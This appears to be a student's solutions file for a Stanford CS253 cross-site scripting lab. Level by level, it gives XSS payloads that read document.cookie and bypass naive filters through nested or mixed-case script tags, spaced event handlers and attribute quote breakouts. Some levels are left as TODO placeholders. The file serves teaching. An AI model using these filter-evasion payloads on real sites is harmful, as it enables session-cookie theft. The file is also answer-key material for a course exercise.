# 0. Welcome

N/A

# 1. A Truly Disruptive Startup (3 points)

```js
<script>console.log(document.cookie)</script>
```

# 2. No Script Allowed (3 points)

Non recursive stripping of ```<script>``` tag allows us to bypass filter by embedding ```script``` within ```script``` like so: ```<scriscriptpt>```

```
<scriscriptpt>console.log(document.cookie)</script>
```

# 3. One More Time, Like You Mean It (3 points)

Same solution as above, except this time the regex will catch all instances of the word ```script```, so we need to hide ```script``` within the end tag as well.

```
<scriscriptpt>console.log(document.cookie)</scriscriptpt>
```

# 4. An Open-and-Shut Case (3 points)

This time regex is used to recursively remove the word ```script``` but the ```i``` flag is not set, so we can just do ```<SCRIPT>``` instead of ```<script>```.

```js
<SCRIPT>console.log(document.cookie)</SCRIPT>
```

# 5. Time to Mix Things Up (3 points)

This time both ```script``` and ```SCRIPT``` are blacklisted so we can use ```ScRiPt``` instead to bypass the filter.

```js
<ScRiPt>console.log(document.cookie)</ScRiPt>
```

# 6. A Picture is Worth a Thousand Words (3 points)

```html
<img src="https://web.stanford.edu/class/cs253/stanford.svg" onload=console.log(document.cookie)>
```

# 7. Between a Rock And a Hard Place (3 points)

Since this regex pattern searches for ```onerror=``` or ```onload=```, we can simply use ```onerror =``` or ```onload =``` instead.

```
/script|onerror=|onload=/gi
```

```html
<img onload =console.log(document.cookie) src="https://web.stanford.edu/class/cs253/stanford.svg">1</img>
```

# 8. Angle of Death (6 points)

Attack input:

```
<<script>>console.log(document.cookie)</script>
```

Server code:

```js
router.get('/search', async (req, res) => {
  let q = req.query.q
  if (q == null) q = ''

  // What I assume the source code regex pattern looks like:
  q = q.replace(/<([^>]*)>/, '')

  const results = await getResults(q)
  res.render('caloogle-search-page', { q, results })
})
```

# 9. All in a Day's Work

N/A

# 10. In the Wrong Place at the Wrong Time (3 points)

Opening angle is now blocked, so new payload will have to be injected into an HTML attribute.

If we search for ```test' hello``` we'll see the output is still ```test' hello```. But ```test" hello``` outputs ```test``` so we know ```"``` is the string terminator. Our new payload is:

```
test" onload=console.log(document.cookie)
```

# 11. You Can't Win 'em All (6 points)

Attack input:

The ```"``` character has been filtered, but only once. So the new payload is:

```
test"" onload=console.log(document.cookie)
```

# 12. When All is Said and Done (6 points)

Attack input:

Similar attack but this time the string is terminated with ```'```.

```
test' onload=console.log(document.cookie)
```

# 13. When You Want a Job Done Right

N/A

# 14. Here Today and Gone Tomorrow (3 points)

Attack URL:

This time we inject into the ```<body>``` tag with the following payload:

```
localhost:4140/search?q=test&lang=en onload=alert(1)
```

# 15. The Early Bird Catches the Worm (3 points)

```
TODO: Replace this with your attack input.
```

# 16. Tying Up Loose Ends (3 points)

```
TODO: Replace this with your attack input.
```

# 17. Take a Page Out of Their Book (6 points)

Attack code:

```js
// TODO: Replace this with your solution.
```

# 18. Congrats

N/A

# Survey responses (3 points)

Write your survey responses in SURVEY.md!
